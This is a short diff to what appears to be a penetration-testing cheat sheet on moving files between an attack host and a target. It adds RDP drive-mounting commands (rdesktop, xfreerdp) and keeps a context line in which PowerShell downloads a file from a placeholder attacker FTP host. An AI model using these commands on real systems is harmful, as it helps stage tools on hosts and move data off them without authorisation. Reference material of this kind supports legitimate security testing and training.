@@ -55,6 +55,15 @@ python3 -m pyftpdlib --port 21
 (New-Object Net.WebClient).DownloadFile('ftp://<attacker_ip>/<filename>', 'output_file')
 ```
 
+- Mounting a linux folder on target host using RDP
+
+```shell
+# Using rdesktop
+rdesktop <target_ip> -d <domain> -u <username> -p <password> -r disk:linux=<folder_path>
+# Using xfreerdp
+xfreerdp /v:<target_ip> /d:<domain> /u:<username> /p:<password> /drive:linux,<folder_path>
+```
+
 ### Upload Files to Attack Host
 
 - Base64 Encode and Decode
